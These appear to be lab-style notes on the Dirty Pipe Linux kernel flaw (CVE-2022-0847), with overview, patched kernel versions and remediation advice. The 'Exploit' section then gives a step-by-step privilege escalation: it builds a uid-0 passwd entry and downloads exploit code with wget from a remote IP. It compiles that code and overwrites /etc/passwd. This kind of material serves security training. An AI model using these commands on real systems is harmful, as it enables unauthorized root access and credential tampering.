# CVE-2022-0847

## **Overview**

Due to their low-level nature, any in-depth discussion of kernel vulnerabilities quickly becomes rather complicated. As such we will keep the information in this task relatively light, in the interests of keeping the information easy to digest. If you would like to read an in-depth explanation of the vulnerability (including a full code analysis), you are highly encouraged to check out Max Kellerman's [original blog post](https://dirtypipe.cm4all.com/).

Before continuing with this task, it is important to note that Dirty Pipe has been fixed in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102, so if you use or manage any Linux (or Android) devices, make sure that they are running a kernel greater than one of these versions!

## **Remediations**

Fortunately, the remediation for this vulnerability is very simple: update your kernel.

Patched versions of the Linux Kernel have been released for supported major kernel versions â€” specifically, the vulnerability has been patched in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102.

Ensure that you apply updates to all of your Linux devices (including any Android) as soon as security patches are released.

## Exploit

Generate password

```bash
openssl passwd -6 --salt haxor "password"
```

Create content file like below ensure single quote are included on both lines.&#x20;

{% code overflow="wrap" %}
```
'haxor:$6$haxor$S1EyCDnHEvfKDzOVa5UKyNiRHrq52LBxSMp3bUDXsfm6tDELpvtIg6scJYeqOe8gimVCPcJypcnNCDp19X4Dp/:0:0::/root:/bin/bash
'
```
{% endcode %}

Find the offset for games in the passwd file&#x20;

```bash
grep -b "games" /etc/passwd
```

Download exploit

```bash
wget 10.14.33.199/CVE-2022-0847.c
```

`Compile exploit`

```bash
gcc CVE-2022-0847.c -o exploit
```

Backup passwd file

```
cp /etc/passwd /tmp/passwd
```

Execute exploit

{% code overflow="wrap" %}
```
./exploit /etc/passwd 189 'haxor:$6$haxor$S1EyCDnHEvfKDzOVa5UKyNiRHrq52LBxSMp3bUDXsfm6tDELpvtIg6scJYeqOe8gimVCPcJypcnNCDp19X4Dp/:0:0::/root:/bin/bash
'
```
{% endcode %}
